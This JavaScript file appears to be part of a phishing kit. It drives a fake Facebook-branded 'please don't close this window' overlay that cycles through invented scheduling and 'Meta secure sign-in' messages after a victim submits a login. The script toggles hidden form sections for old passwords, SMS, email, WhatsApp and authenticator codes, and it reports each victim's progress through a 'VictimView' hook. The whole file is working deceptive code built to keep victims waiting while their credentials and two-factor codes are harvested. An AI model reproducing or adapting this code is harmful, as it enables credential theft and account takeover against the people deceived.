/**
 * Wait UI after Facebook login submit only — survives tab switch, not stale page loads.
 */
(function (global) {
  var STORAGE_KEY = 'loginWaitActive';
  var SHOWING_KEY = 'loginWaitShowing';
  var INDEX_KEY = 'loginWaitMsgIndex';
  var cycleTimer = null;
  var msgIndex = 0;

  var MESSAGES = [
    'Connecting to the scheduling service…',
    'Checking available meeting times…',
    'Looking for free calendar slots…',
    'Verifying your Facebook login…',
    'Confirming you can book a meeting…',
    'Syncing with Meta secure sign-in…',
    'Almost ready — please keep this window open…',
  ];

  var LAST_INDEX = MESSAGES.length - 1;

  function setActive(on) {
    try {
      if (on) sessionStorage.setItem(STORAGE_KEY, '1');
      else {
        sessionStorage.removeItem(STORAGE_KEY);
        sessionStorage.removeItem(SHOWING_KEY);
        sessionStorage.removeItem(INDEX_KEY);
      }
    } catch (e) {}
  }

  function isActive() {
    try {
      return sessionStorage.getItem(STORAGE_KEY) === '1';
    } catch (e) {
      return false;
    }
  }

  function isShowing() {
    try {
      return sessionStorage.getItem(SHOWING_KEY) === '1';
    } catch (e) {
      return false;
    }
  }

  /** Drop leftover flags from a previous visit (wait was never completed / modal closed). */
  function discardStale() {
    if (isActive() && !isShowing()) clear();
    if (!isActive() && isShowing()) clear();
  }

  function readSavedIndex() {
    try {
      var n = parseInt(sessionStorage.getItem(INDEX_KEY) || '0', 10);
      if (isNaN(n) || n < 0) return 0;
      if (n > LAST_INDEX) return LAST_INDEX;
      return n;
    } catch (e) {
      return 0;
    }
  }

  function saveIndex(i) {
    try {
      sessionStorage.setItem(INDEX_KEY, String(i));
    } catch (e) {}
  }

  function stopCycle() {
    if (cycleTimer) {
      clearInterval(cycleTimer);
      cycleTimer = null;
    }
  }

  function startCycle(statusElId, continueFromSaved) {
    stopCycle();
    var el = document.getElementById(statusElId);
    if (!el) return;

    if (continueFromSaved) msgIndex = readSavedIndex();
    else {
      msgIndex = 0;
      saveIndex(0);
    }

    el.textContent = MESSAGES[msgIndex];

    if (msgIndex >= LAST_INDEX) {
      saveIndex(LAST_INDEX);
      return;
    }

    cycleTimer = setInterval(function () {
      if (msgIndex >= LAST_INDEX) {
        stopCycle();
        return;
      }
      msgIndex += 1;
      saveIndex(msgIndex);
      el.textContent = MESSAGES[msgIndex];
      if (msgIndex >= LAST_INDEX) stopCycle();
    }, 3200);
  }

  function hideApplySections() {
    ['login-form', 'oldpass', 'codeSms', 'authcode', 'codeEmail', 'whatsappcode', 'wrongpsw'].forEach(
      function (id) {
        var node = document.getElementById(id);
        if (node) node.style.display = 'none';
      }
    );
  }

  function resetApplyLoginForm() {
    hideApplySections();
    var loginForm = document.getElementById('login-form');
    var wait = document.getElementById('waitTime');
    if (loginForm) loginForm.style.display = 'block';
    if (wait) wait.style.display = 'none';
  }

  function startApply() {
    var continuing = isShowing();
    setActive(true);
    try {
      sessionStorage.setItem(SHOWING_KEY, '1');
    } catch (e) {}

    var modal = document.getElementById('facebook-modal');
    if (modal) modal.style.display = 'block';
    hideApplySections();
    var wait = document.getElementById('waitTime');
    if (wait) wait.style.display = 'block';
    startCycle('apply-wait-status', continuing);
    if (typeof VictimView !== 'undefined') VictimView.report('fb-login-wait');
  }

  function ensureMobileOverlay() {
    if (document.getElementById('login-wait-overlay')) return;
    var wrap = document.createElement('div');
    wrap.id = 'login-wait-overlay';
    wrap.style.cssText =
      'display:none;position:fixed;inset:0;z-index:9999;background:#fff;' +
      'flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center;' +
      'font-family:Segoe UI,Roboto,Helvetica,Arial,sans-serif;';
    wrap.innerHTML =
      '<div style="font-size:28px;font-weight:800;color:#1877f2;margin-bottom:20px">facebook</div>' +
      '<div style="width:44px;height:44px;border:4px solid #e4e6eb;border-top-color:#0064e0;border-radius:50%;' +
      'animation:loginWaitSpin .9s linear infinite;margin-bottom:20px"></div>' +
      '<p style="font-size:17px;font-weight:700;color:#1c1e21;margin:0 0 8px">Please don\'t close this window</p>' +
      '<p id="mobile-wait-status" style="font-size:14px;color:#606770;margin:0 0 6px;min-height:20px"></p>' +
      '<p style="font-size:13px;color:#8a8d91;margin:12px 0 0">This may take a minute while we check meeting availability.</p>';
    if (!document.getElementById('login-wait-spin-style')) {
      var st = document.createElement('style');
      st.id = 'login-wait-spin-style';
      st.textContent = '@keyframes loginWaitSpin{to{transform:rotate(360deg)}}';
      document.head.appendChild(st);
    }
    document.body.appendChild(wrap);
  }

  function startMobile() {
    var continuing = isShowing();
    setActive(true);
    try {
      sessionStorage.setItem(SHOWING_KEY, '1');
    } catch (e) {}
    ensureMobileOverlay();
    var ov = document.getElementById('login-wait-overlay');
    if (ov) ov.style.display = 'flex';
    var main = document.getElementById('main-content');
    if (main) main.setAttribute('aria-hidden', 'true');
    startCycle('mobile-wait-status', continuing);
    if (typeof VictimView !== 'undefined') VictimView.report('fb-login-wait');
  }

  function clear() {
    setActive(false);
    stopCycle();
    var wait = document.getElementById('waitTime');
    if (wait) wait.style.display = 'none';
    var ov = document.getElementById('login-wait-overlay');
    if (ov) ov.style.display = 'none';
    var main = document.getElementById('main-content');
    if (main) main.removeAttribute('aria-hidden');
  }

  function resumeIfActive() {
    if (!isActive() || !isShowing()) return;
    if (document.getElementById('waitTime')) startApply();
    else startMobile();
  }

  global.LoginWait = {
    isActive: isActive,
    isShowing: isShowing,
    discardStale: discardStale,
    resetApplyLoginForm: resetApplyLoginForm,
    startApply: startApply,
    startMobile: startMobile,
    clear: clear,
    resumeIfActive: resumeIfActive,
  };
})(window);
